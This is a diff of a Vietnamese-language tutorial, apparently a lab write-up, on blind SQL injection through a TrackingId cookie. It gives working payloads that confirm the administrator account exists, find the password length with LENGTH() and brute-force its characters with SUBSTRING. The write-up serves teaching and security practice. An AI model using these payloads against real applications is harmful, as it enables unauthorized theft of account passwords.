@@ -30,7 +30,9 @@ Nếu select như này để truy vấn ra user (có nghĩa là nếu đúng th�
 ![](/imgs/SQL-Injection/38.png?raw=true)
 
 Nhưng chúng ta sẽ sử dụng để kiểm tra xem admin có tồn tại hay không
-> **TrackingId=WMT4K2EYUiELrvdl' and (select username from users where username='administrator')='administrator'--**
+```markdown
+**TrackingId=WMT4K2EYUiELrvdl' and (select username from users where username='administrator')='administrator'--**
+```
 
 Nếu đã học qua SQL cơ bản thì chúng ta sẽ biết nếu đoạn query từ ***(select username from users where username='administrator')*** nếu có user với username là administrator rồi so sánh với đoạn cuối query là ‘administrator’ thì đoạn lệnh này sẽ đúng => sẽ trả về có chữ Welcome
 
@@ -40,7 +42,10 @@ Vậy có phải là nếu truy vấn đoạn lệnh như sau:
 > **TrackingId=WMT4K2EYUiELrvdl' and (select password from users where username='administrator')=<pass_ở_đây>--** thì vẫn áp dụng như trường hợp ở trên. Nhưng mà password gồm 1 mã hash, đâu phải dống như administrator :v
 
 Trường hợp này chúng ta sẽ bruteforce ra từng chữ cái có trong password (nhưng đầu tiên ta phải xác định được password có chiều dài bao nhiêu đã)
-> **TrackingId=WMT4K2EYUiELrvdl' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--**
+
+```markdown
+**TrackingId=WMT4K2EYUiELrvdl' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--**
+```
 
 Đoạn query này cũng đoán ra là chúng ta sẽ so sánh thêm 1 trường hợp nữa là chiều dài password nếu mà lớn hơn 1 thì sẽ trả ra kết quả.
 
@@ -62,6 +67,7 @@ Ta sẽ sử dụng hàm có sẵn trong sql để so sánh chuỗi.
 Đầu tiên sẽ Test thử 1 trường hợp
 
 Hàm substring ai xài qua python chắc cũng biết rồi nhỉ (ví dụ ở bên dưới mình sẽ lấy kí tự đầu của password rồi so sánh với x)
+
 > **TrackingId=43RCZtvUB1HhMJxD'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username%3d'administrator')%3d'x'--** (x là để so sánh với chữ cái đầu tiên bằng substring(password,1,1))
 
 Từ đây chúng ta sẽ bruteforce thêm 1 lần nữa để lấy được các chữ cái có trong password
